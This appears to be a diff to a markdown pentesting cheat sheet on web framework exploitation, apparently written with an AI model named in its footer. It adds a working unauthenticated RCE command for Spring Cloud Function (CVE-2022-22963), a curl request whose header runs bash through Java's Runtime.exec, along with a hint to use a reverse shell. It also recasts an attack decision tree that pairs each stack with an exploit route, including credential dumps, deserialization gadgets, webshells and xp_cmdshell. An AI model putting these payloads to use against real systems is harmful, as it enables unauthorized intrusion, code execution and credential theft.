@@ -250,6 +250,17 @@ T(java.lang.Math).random()
 
 ---
 
+### Spring Cloud Function SpEL RCE (CVE-2022-22963)
+
+Distinct from Spring4Shell (disclosed the same week). Spring Cloud Function ≤ 3.2.2 evaluates the `spring.cloud.function.routing-expression` **request header** as SpEL — a one-shot unauthenticated RCE, no gadget or WAR deployment needed.
+
+```bash
+curl -X POST "http://target.com/functionRouter" \
+  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","id"})' \
+  -H 'Content-Type: text/plain' -d 'data'
+# Blind — redirect to a file and read it back, or use a reverse shell in the exec()
+```
+
 ### Spring4Shell (CVE-2022-22965)
 
 Spring MVC with JDK 9+, Tomcat as WAR deployment.
@@ -801,35 +812,35 @@ If `text/template` is used instead of `html/template` (or `Execute` vs `ExecuteT
 
 ## Quick Attack Decision Tree
 
-```bash
-Identify stack (whatweb, headers, cookies, error pages)
-│
-├── Java / Spring
-│   ├── /actuator exposed?          → dump env, heapdump → extract creds/keys
-│   ├── User input rendered?        → SSTI (Thymeleaf/Freemarker)
-│   ├── Serialized object in param? → ysoserial (CC6 first)
-│   └── Log4j version < 2.15?       → Log4Shell JNDI
-│
-├── NodeJS
-│   ├── User input in template?     → SSTI (Pug/EJS/Handlebars)
-│   ├── JSON merge without sanity?  → Prototype pollution
-│   └── Serialized cookie?          → node-serialize RCE
-│
-├── Python / Flask
-│   ├── User input rendered?        → SSTI Jinja2
-│   ├── Debugger active?            → Werkzeug PIN → RCE
-│   └── Pickle in cookie/param?     → pickle deserialization
-│
-├── ASP.NET
-│   ├── web.config readable?        → machineKey → ViewState RCE
-│   ├── File upload to web root?    → ASPX webshell
-│   ├── MSSQL backend?              → SQLi → xp_cmdshell
-│   └── Encrypted cookie?           → padding oracle
-│
-└── Ruby on Rails
-    ├── User input in template?     → ERB SSTI
-    ├── Old Rails (< 4)?            → Marshal deserialization
-    └── User creation/update?       → mass assignment (admin:true)
+```mermaid
+flowchart TD
+    ID["Identify stack<br/>(whatweb · headers · cookies · error pages)"] --> J["Java / Spring"]
+    ID --> N["Node.js"]
+    ID --> P["Python / Flask"]
+    ID --> A["ASP.NET"]
+    ID --> R["Ruby on Rails"]
+
+    J --> J1["/actuator exposed: dump env / heapdump for creds/keys"]
+    J --> J2["input rendered: SSTI (Thymeleaf / Freemarker)"]
+    J --> J3["serialized object in param: ysoserial (CC6 first)"]
+    J --> J4["Log4j pre-2.15: Log4Shell JNDI"]
+
+    N --> N1["input in template: SSTI (Pug / EJS / Handlebars)"]
+    N --> N2["unsanitized JSON merge: prototype pollution"]
+    N --> N3["serialized cookie: node-serialize RCE"]
+
+    P --> P1["input rendered: Jinja2 SSTI"]
+    P --> P2["debugger active: Werkzeug PIN then RCE"]
+    P --> P3["pickle in cookie/param: pickle deser"]
+
+    A --> A1["web.config readable: machineKey then ViewState RCE"]
+    A --> A2["upload to web root: ASPX webshell"]
+    A --> A3["MSSQL backend: SQLi then xp_cmdshell"]
+    A --> A4["encrypted cookie: padding oracle"]
+
+    R --> R1["input in template: ERB SSTI"]
+    R --> R2["old Rails (pre-4): Marshal deser"]
+    R --> R3["user create/update: mass assignment"]
 ```
 
 ---
@@ -861,5 +872,5 @@ Identify stack (whatweb, headers, cookies, error pages)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-25*
-*Model: claude-opus-5*
+*Updated: 2026-09-26*
+*Model: claude-opus-4-8*
